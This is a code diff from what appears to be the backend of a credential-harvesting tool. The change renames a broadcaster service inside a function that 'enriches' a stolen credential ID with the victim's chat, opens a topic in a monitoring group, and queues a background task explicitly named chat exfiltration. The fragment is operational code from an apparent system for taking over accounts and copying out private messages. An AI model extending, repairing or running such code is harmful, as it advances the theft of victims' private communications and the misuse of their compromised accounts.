@@ -202,7 +202,7 @@ async def _enrich_logic(cred_id: str):
     
     topic_id = 0
     try:
-        topic_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
+        topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
         # Header handled by ensure_topic automatically
     except Exception as e:
         print(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
@@ -224,7 +224,7 @@ async def _enrich_logic(cred_id: str):
     
     # Trigger Exfiltration for Primary
     print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
-    await broadcaster_service.send_log(f"🚀 Triggering background exfiltration task.")
+    await broadcaster.send_log(f"🚀 Triggering background exfiltration task.")
     exfiltrate_chat.delay(cred_id)
     
     msg = f"Enriched {cred_id} with chat {first_chat['id']}."
